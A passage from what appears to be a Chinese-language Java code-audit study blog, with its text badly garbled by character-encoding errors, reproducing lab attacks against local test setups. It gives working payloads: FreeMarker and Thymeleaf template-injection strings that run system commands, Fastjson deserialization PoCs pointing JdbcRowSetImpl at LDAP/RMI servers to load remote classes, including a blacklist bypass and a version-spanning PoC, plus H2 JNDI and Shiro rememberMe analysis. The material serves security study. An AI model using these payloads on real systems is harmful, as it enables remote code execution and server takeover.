(cnblogs.com)</a></p><ul><li><p>æ­å»ºå¥½ç¯å¢ƒè¿›å…¥åå°</p></li><li><p>è®¿é—®é¡µé¢<a href="http://localhost:8090/h2-console">http://localhost:8090/h2-console</a></p></li><li><p>åˆ©ç”¨jndiæ³¨å…¥å·¥å…·ç”Ÿæˆpoc</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A126.png"></p></li><li><p>ä¼ å€¼</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A127.png"></p><p>javax.naming.InitialContext</p><p>æ³¨å…¥ä½¿ç”¨çš„poc</p></li><li><p>å®æ“å¹¶æœªå¼¹å‡ºè®¡ç®—å™¨ï¼ŒçŒœæµ‹æ˜¯jdkç‰ˆæœ¬è¿‡é«˜</p></li><li><p>æ­¤æ¼æ´åˆ©ç”¨è¦æ±‚ï¼šH2 databaseè‡ªå¸¦çš„webç®¡ç†é¡µé¢å…è®¸å¤–éƒ¨ç”¨æˆ·è®¿é—®webç®¡ç†ç•Œé¢ï¼Œä¸”ä¸ç»è¿‡èº«ä»½éªŒè¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è¿™ä¸ªå°±æ˜¯è®¾ç½®å¯ç”¨è¿˜æ˜¯ç¦ç”¨webç®¡ç†ç•Œé¢</span><br>spring.h2.console.enabled=<span class="hljs-literal">true</span><br><span class="hljs-comment">//è¿™ä¸ªå°±æ˜¯è®¾ç½®æ˜¯å¦å…è®¸å¤–éƒ¨ç”¨æˆ·è¿›è¡Œè®¿é—®ç®¡ç†ç•Œé¢ï¼Œå¹¶ä¸é€šè¿‡èº«ä»½éªŒè¯</span><br>spring.h2.console.settings.web-allow-others=<span class="hljs-literal">true</span><br>å¦‚æœè¿™ä¸¤ä¸ªè®¾ç½®é’§å¼€å¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨jndiè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚<br></code></pre></td></tr></table></figure></li></ul><h3 id="SSTIæ¨¡æ¿æ³¨å…¥"><a href="#SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥"></a>SSTIæ¨¡æ¿æ³¨å…¥</h3><ol><li>æ‰¾é¡¹ç›®ä¸­æ˜¯å¦å­˜åœ¨æ¨¡æ¿å¼•æ“(ç±»å‹åŠå®‰å…¨é—®é¢˜)</li><li>æ‰¾æ¨¡æ¿æ³¨å…¥åˆ©ç”¨å…¥å£æ¡ä»¶</li><li>æ‰¾å¯æ§åœ°æ–¹è¿›è¡Œæµ‹è¯•æ£€æµ‹</li></ol><ul><li><p>å¸¸è§æ¨¡æ¿å¼•æ“</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A128.png"></p></li></ul><h4 id="Haloæ¡ˆä¾‹-FreeMarkeræ¨¡æ¿"><a href="#Haloæ¡ˆä¾‹-FreeMarkeræ¨¡æ¿" class="headerlink" title="Haloæ¡ˆä¾‹(FreeMarkeræ¨¡æ¿)"></a>Haloæ¡ˆä¾‹(FreeMarkeræ¨¡æ¿)</h4><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html">Javaå®‰å…¨ä¹‹freemarker æ¨¡æ¿æ³¨å…¥ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><ul><li><p>å…¨å±€æœç´¢å…³é”®å­—freemarker,å‘ç°æºä»£ç ä¸­æœ‰freemarkerçš„é…ç½®</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A129.png"></p><p>å‘ç°FreeMarkerçš„é…ç½®æ–‡ä»¶æ˜¯ .ftlåç¼€   </p></li><li><p>ä¿®æ”¹resources\templates\themes\anatole\index.ftlæ–‡ä»¶</p><p>åŠ å…¥poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;<br>æˆ–<br>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;test(&quot;calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ­¤å®¹å™¨ï¼Œæ‰“å¼€é¦–é¡µå‘ç°æœ‰è®¡ç®—æœºå¼¹å‡ºï¼Œæ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤</p></li><li><p>æ¼æ´åˆ©ç”¨</p><ul><li>æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ä¸­å¯æ§å˜é‡ï¼Œå†™å…¥poc</li></ul></li><li><p>æ­¤æºä»£ç æ²¡æœ‰åˆ©ç”¨å…¥å£</p></li></ul><h4 id="RuoYi-v4-6-0æ¡ˆä¾‹-Thymeleaf"><a href="#RuoYi-v4-6-0æ¡ˆä¾‹-Thymeleaf" class="headerlink" title="RuoYi-v4.6.0æ¡ˆä¾‹(Thymeleaf)"></a>RuoYi-v4.6.0æ¡ˆä¾‹(Thymeleaf)</h4><p><a href="https://xz.aliyun.com/news/9281">Thymeleaf Fragment æ³¨å…¥æ¼æ´å¤ç°åŠæ–°å§¿åŠ¿æ‰©å±•-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><ul><li><p>æœç´¢å…³é”®å­—å‘ç°æ˜¯Thymeleafæ¨¡æ¿</p></li><li><p>æ‰¾å…¥å£(å¯»æ‰¾ä¸æ–‡ç« ä¸­ç±»ä¼¼çš„returnå…¥å£)</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A130.png"></p><p>å­˜åœ¨å¯æ§å˜é‡çš„returnå…¥å£</p></li><li><p>æ‰¾åˆ°è·¯ç”± </p><p><a href="http://localhost:8088/monitor/cache">http://localhost:8088/monitor/cache</a></p></li><li><p>æŠ“å–æ•°æ®åŒ…åæ›´æ”¹å˜é‡fragmentçš„å€¼ï¼Œä¼ å…¥payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x<br></code></pre></td></tr></table></figure><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A131.png"></p><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p></li></ul><h3 id="FastJsonååºåˆ—åŒ–æ¼æ´"><a href="#FastJsonååºåˆ—åŒ–æ¼æ´" class="headerlink" title="FastJsonååºåˆ—åŒ–æ¼æ´"></a>FastJsonååºåˆ—åŒ–æ¼æ´</h3><p><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><p><a href="https://xz.aliyun.com/news/12174#toc-16">https://xz.aliyun.com/news/12174#toc-16</a> (Javaååºåˆ—åŒ–ä¹‹FastJsonååºåˆ—åŒ–åŠç»•è¿‡)</p><p><a href="https://www.ddosi.org/fastjson-payload/#Fastjson_1222-1224">Fastjsonæ¼æ´åˆ©ç”¨å§¿åŠ¿æŠ€å·§é›†åˆ | Fastjson payload - ğŸ”°é›¨è‹â„’ğŸ”° (ddosi.org)</a></p><h4 id="fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#fastjsonååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"></a>fastjsonååºåˆ—åŒ–æ¼æ´åŸç†</h4><ul><li><p>ä½¿ç”¨AutoTypeåŠŸèƒ½è¿›è¡Œåºåˆ—åŒ–çš„JSONå­—ç¬¦ä¼šå¸¦æœ‰ä¸€ä¸ª@typeæ¥æ ‡è®°å…¶å­—ç¬¦çš„åŸå§‹ç±»å‹</p></li><li><p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¯»å–è¿™ä¸ª@typeï¼Œæ¥è¯•å›¾æŠŠJSONå†…å®¹ååºåˆ—åŒ–åˆ°å¯¹è±¡ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨è¿™ä¸ªåº“çš„setæˆ–è€…getæ–¹æ³•</p></li><li><p>@typeçš„ç±»æœ‰å¯èƒ½è¢«æ¶æ„æ„é€ ï¼Œæ„é€ ä¸€ä¸ªJSONï¼Œä½¿ç”¨@typeæŒ‡å®šä¸€ä¸ªæƒ³è¦çš„æ”»å‡»ç±»åº“å°±å¯ä»¥å®ç°æ”»å‡»ã€‚</p></li><li><p>å¸¸è§çš„æœ‰sunå®˜æ–¹æä¾›çš„ä¸€ä¸ªç±»com.sun.rowset.JdbcRowSetImplï¼Œå…¶ä¸­æœ‰ä¸ªdataSourceNameæ–¹æ³•æ”¯æŒä¼ å…¥ä¸€ä¸ªrmiçš„æºï¼Œåªè¦è§£æå…¶ä¸­çš„urlå°±ä¼šæ”¯æŒè¿œç¨‹è°ƒç”¨ï¼å› æ­¤æ•´ä¸ªæ¼æ´å¤ç°çš„åŸç†è¿‡ç¨‹å°±æ˜¯ï¼š</p><ol><li>æ”»å‡»è€…ï¼ˆæˆ‘ä»¬ï¼‰è®¿é—®å­˜åœ¨fastjsonæ¼æ´çš„ç›®æ ‡é¶æœºç½‘ç«™ï¼Œé€šè¿‡burpsuiteæŠ“åŒ…æ”¹åŒ…ï¼Œä»¥jsonæ ¼å¼æ·»åŠ com.sun.rowset.JdbcRowSetImplæ¶æ„ç±»ä¿¡æ¯å‘é€ç»™ç›®æ ‡æœºã€‚</li><li>å­˜åœ¨æ¼æ´çš„é¶æœºå¯¹jsonååºåˆ—åŒ–æ—¶å€™ï¼Œä¼šåŠ è½½æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„æ¶æ„ä¿¡æ¯(è®¿é—®rmiæœåŠ¡å™¨)ï¼Œé¶æœºæœåŠ¡å™¨å°±ä¼šå‘rmiæœåŠ¡å™¨è¯·æ±‚å¾…æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯é¶æœºæœåŠ¡å™¨é—®rmiæœåŠ¡å™¨ï¼Œï¼ˆé¶æœºæœåŠ¡å™¨ï¼‰éœ€è¦æ‰§è¡Œä»€ä¹ˆå‘½ä»¤</li><li>rmi æœåŠ¡å™¨è¯·æ±‚åŠ è½½è¿œç¨‹æœºå™¨çš„classï¼ˆè¿™ä¸ªè¿œç¨‹æœºå™¨æ˜¯æˆ‘ä»¬æ­å»ºå¥½çš„æ¶æ„ç«™ç‚¹ï¼Œæå‰å°†æ¼æ´åˆ©ç”¨çš„ä»£ç ç¼–è¯‘å¾—åˆ°.classæ–‡ä»¶ï¼Œå¹¶ä¸Šä¼ è‡³æ¶æ„ç«™ç‚¹ï¼‰ï¼Œå¾—åˆ°æ”»å‡»è€…ï¼ˆæˆ‘ä»¬ï¼‰æ„é€ å¥½çš„å‘½ä»¤ï¼ˆping dnslogæˆ–è€…åˆ›å»ºæ–‡ä»¶æˆ–è€…åå¼¹shellå•¥çš„ï¼‰</li><li>rmiå°†è¿œç¨‹åŠ è½½å¾—åˆ°çš„classï¼ˆæ¶æ„ä»£ç ï¼‰ï¼Œä½œä¸ºå“åº”è¿”å›ç»™é¶æœºæœåŠ¡å™¨ã€‚<br>é¶æœºæœåŠ¡å™¨æ‰§è¡Œäº†æ¶æ„ä»£ç ï¼Œè¢«æ”»å‡»è€…æˆåŠŸåˆ©ç”¨ã€‚</li></ol></li></ul><h4 id="Jndiæ³¨å…¥åŸç†"><a href="#Jndiæ³¨å…¥åŸç†" class="headerlink" title="Jndiæ³¨å…¥åŸç†"></a>Jndiæ³¨å…¥åŸç†</h4><ul><li><p>JNDIå³Java Naming and Directory Interfaceï¼ˆJAVAå‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚</p></li><li><p>JNDI æ³¨å…¥ï¼Œå³å½“å¼€å‘è€…åœ¨å®šä¹‰ <code>JNDI</code> æ¥å£åˆå§‹åŒ–æ—¶ï¼Œ<code>lookup()</code> æ–¹æ³•çš„å‚æ•°å¯æ§ï¼Œæ”»å‡»è€…å°±å¯ä»¥å°†æ¶æ„çš„ <code>url</code> ä¼ å…¥å‚æ•°è¿œç¨‹åŠ è½½æ¶æ„è½½è·ï¼Œé€ æˆæ³¨å…¥æ”»å‡»ã€‚</p></li></ul><h4 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h4><h5 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h5><ul><li><p>FastjsonController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>åŠ å…¥Userç±»è§£æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œåå‘ç°ä¼ å…¥å…¶ä»–ç±»è§£æåé»˜è®¤æ‰§è¡Œget  setç±»æ–¹æ³•</p></li><li><p>æ„é€ poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//è§¦å‘fastjsonååºåˆ—åŒ–ç”¨åˆ°JSON.parseObject,JSON.parse()</span><br><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br>        String poc=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.31.80.1:1389/fjfljn\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(poc);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼ï¼ï¼</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A132.png"></p></li><li><p>ååºåˆ—åŒ–åŸç†åˆ†æ</p><ul><li><p>ä¼ å…¥å…¶ä»–ç±»è§£ææ—¶ä¼šè°ƒç”¨  getdataSourceNameï¼ŒsetdataSourceNameï¼Œ</p><pre><code class="hljs">                                         getautoCommitï¼ŒsetautoCommitæ–¹æ³•</code></pre></li><li><p>è°ƒç”¨setAutoCommitæ–¹æ³•æ—¶è°ƒç”¨äº† connectæ–¹æ³•ï¼Œconnectæ–¹æ³•ä¸­è°ƒç”¨äº†lookup()æ–¹æ³•</p><p>æ§åˆ¶æ³¨å…¥æ ¸å¿ƒè§¦å‘ä»£ç </p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A133.png"></p></li><li><p>åˆ†æè¿‡ç¨‹</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A134.png"></p></li></ul></li></ul><h5 id="1-2-25ç‰ˆæœ¬"><a href="#1-2-25ç‰ˆæœ¬" class="headerlink" title="1.2.25ç‰ˆæœ¬"></a>1.2.25ç‰ˆæœ¬</h5><ul><li><p>å‘ç°åŸæ¥çš„pocæ— æ³•æ‰§è¡Œ</p></li><li><p>å®šä½åˆ°<code>checkAutoType()</code>æ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„é€»è¾‘ï¼šå¦‚æœå¼€å¯äº†<code>autoType</code>ï¼Œé‚£ä¹ˆå°±å…ˆåˆ¤æ–­ç±»ååœ¨ä¸åœ¨ç™½åå•ä¸­ï¼Œå¦‚æœåœ¨å°±ç”¨<code>TypeUtils.loadClass</code>åŠ è½½ï¼Œå¦‚æœä¸åœ¨å°±å»åŒ¹é…é»‘åå•ï¼š</p><p>jndiæ³¨å…¥éœ€è¦çš„ç±»ååœ¨é»‘åå•ä¸­ï¼ŒautoTypeé»˜è®¤å…³é—­ï¼Œæ— æ³•ä½¿ç”¨åŸpoc</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7ZibH49F3GjQpYAic5fibnLPIPibNDVZ3Zq8iaeA6uxPbqOxqcd536j9ztw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1"></p></li><li><p>åœ¨demo controllerä¸­æ·»åŠ ä¸€è¡Œä»£ç ï¼Œå¼€å¯AutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>åœ¨åŸpocåŒ…åå‰åŠ ä¸ŠLï¼Œåé¢åŠ ;</p><p>å³å¯å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A135.png"></p></li><li><p>å‘æ˜ä¸¤æ­¥éª¤çš„åŸå› </p><ul><li><p>å‰åŠ Lï¼ŒååŠ ï¼›ï¼Œç”¨äºç»•è¿‡é»‘åå•ï¼Œåç»­æœ‰æ–¹æ³•å»é™¤Lä¸ï¼›</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A136.png"></p></li><li><p>å¼€å¯autoType</p><p>æ–­ç‚¹è°ƒè¯•åå‘ç°ï¼Œå¦‚æœä¸å¼€å¯autoTypeï¼Œä¸ä¼šåŒ¹é…ç™½åå•ï¼Œä¼šç›´æ¥çˆ†å‡ºautoType is not support</p><p>åç»­ä»£ç éƒ½å…¨éƒ¨æ˜¾ç¤ºå¼‚å¸¸</p></li></ul></li></ul><h5 id="1-2-25-1-2-47é€šæ€poc"><a href="#1-2-25-1-2-47é€šæ€poc" class="headerlink" title="1.2.25-1.2.47é€šæ€poc"></a>1.2.25-1.2.47é€šæ€poc</h5><ul><li><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1/exp&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></td></tr></table></figure></li><li><p>æµ‹è¯•å‘ç°èƒ½æ­£å¸¸å¼¹å‡ºè®¡ç®—å™¨</p></li><li><p>åˆ©ç”¨æ­¥éª¤</p><ul><li>åˆ©ç”¨java.lang.Classå°†æ¶æ„ç±»åŠ è½½åˆ°mappingsä¸­</li><li>ä»mappingsä¸­å–å‡ºæ¶æ„ä»£ç å¹¶ç»•è¿‡é»‘åå•è¿›è¡Œååºåˆ—åŒ–</li></ul></li></ul><h3 id="Shiroååºåˆ—åŒ–"><a href="#Shiroååºåˆ—åŒ–" class="headerlink" title="Shiroååºåˆ—åŒ–"></a>Shiroååºåˆ—åŒ–</h3><ul><li><p>shiroååºåˆ—åŒ–é“¾åˆ†æ(è·å–ç”¨æˆ·è¯·æ±‚)</p><ul><li>è·å–cookieä¸­rememberMeçš„å€¼</li><li>å¯¹rememberè¿›è¡ŒBase64è§£ç </li><li>ä½¿ç”¨AESè§£å¯†</li><li>å¯¹è§£å¯†çš„å€¼è¿›è¡Œååºåˆ—åŒ–</li></ul><p>550ï¼šShiro-550 æ¼æ´ä¸»è¦æ˜¯ç”±äº Shiro çš„ <em>rememberMe</em> å†…å®¹ååºåˆ—åŒ–å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚å…¶åŸå› æ˜¯é»˜è®¤åŠ å¯†å¯†é’¥ç¡¬ç¼–ç åœ¨ Shiro æºç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ã€ç¼–ç ï¼Œç„¶åå°†å…¶ä½œä¸º cookie çš„ rememberMe å­—æ®µå†…å®¹å‘é€ï¼ŒShiro å°†å¯¹å…¶è§£ç å’Œååºåˆ—åŒ–ï¼Œå¯¼è‡´æœåŠ¡å™¨è¿è¡Œæ¶æ„ä»£ç ã€‚</p><p>721ï¼šShiro-721 æ¼æ´åˆ©ç”¨äº† AES-128-CBC åŠ å¯†æ¨¡å¼çš„ Padding Oracle Attackã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ Padding Oracle åŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„ rememberMe å­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p></li></ul><h4 id="æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ"><a href="#æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ"></a>æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ</h4><h5 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h5><p><a href="https://www.cnblogs.com/nice0e3/p/14183173.html">Javaå®‰å…¨ä¹‹Shiro 550ååºåˆ—åŒ–æ¼æ´åˆ†æ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><ul><li><p>ç»™jstlåŠ ä¸Šç‰ˆæœ¬ä¸º1.2</p></li><li><p>tomcatéƒ¨ç½²å·¥ä»¶</p></li><li><p>è®¿é—®url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8089/samples_web_war/login.jsp<br></code></pre></td></tr></table></figure></li><li><p>ç™»å½•æ—¶æŠ“å–æ•°æ®åŒ…</p></li><li><p>åœ¨è¿”å›åŒ…ä¸­æ‰¾åˆ°cookieå…³é”®å­—ä¸ºrememberMe</p></li><li><p>é€šè¿‡å…³é”®å­—çˆ†ç ´å¯†é’¥å¹¶æ£€æµ‹</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A137.png"></p></li><li><p>æ¼æ´åˆ†æ</p></li><li><p>åœ¨DefaultSecurityManagerç±»çš„rememberMeSuccessfulLoginæ–¹æ³•å¤„ä¸‹æ–­ç‚¹</p><p>ç›®çš„ï¼š</p><ul><li>shiroç™»é™†æ“ä½œæ‰§è¡Œé€»è¾‘</li><li>ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿ</li><li>åˆ©ç”¨æ¡ä»¶</li></ul></li><li><p>è¿½è¸ªå‡½æ•°åå‘ç°</p><ul><li><p>åŠ å¯†ï¼šåºåˆ—åŒ–-&gt;aesåŠ å¯†-&gt;base64åŠ å¯†-&gt;å­˜å…¥cookie</p></li><li><p>æ¥å—åºåˆ—åŒ–æ•°æ®è§£å¯†</p><p>æ¥å—è§£å¯†ï¼šbase64è§£ç -&gt;aesè§£å¯†-&gt;ååºåˆ—åŒ–</p></li></ul></li><li><p>è°ƒè¯•æ—¶å‘ç°çš„AESåŠ å¯†å¯†é’¥</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A138.png"></p><p>keyæ•°ç»„å¯åˆ©ç”¨pythonè„šæœ¬è¿˜åŸä¸ºåŸå¯†é’¥å­—ç¬¦ä¸²</p></li><li><p>shiroååºåˆ—åŒ–æ— æ³•åˆ©ç”¨fastjsonçš„åˆ©ç”¨é“¾</p><ul><li><p>åŸå› 